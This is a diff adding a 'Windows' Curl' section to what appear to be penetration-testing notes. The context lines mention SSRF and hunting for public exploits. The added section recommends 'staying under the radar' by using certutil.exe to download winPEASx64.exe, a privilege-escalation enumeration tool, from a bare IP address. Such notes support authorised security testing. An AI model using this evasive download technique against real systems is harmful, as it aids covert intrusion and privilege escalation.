@@ -283,3 +283,9 @@ If for whatever reason (such as doing a SSRF) 127.0.0.1 & localhost (or any othe
 
 When a version for ANYTHING is exposed or uncovered, DO NOT SKIP OVER THIS and search the web for public exploits. This will be a part of your process.
 
+#### Windows' Curl
+
+Stay under the radar and use certutil.exe on Windows to download files from the internet:
+```bash
+certutil.exe -f -urlcache http://123.123.123.123/winPEASx64.exe winpeas.exe
+```
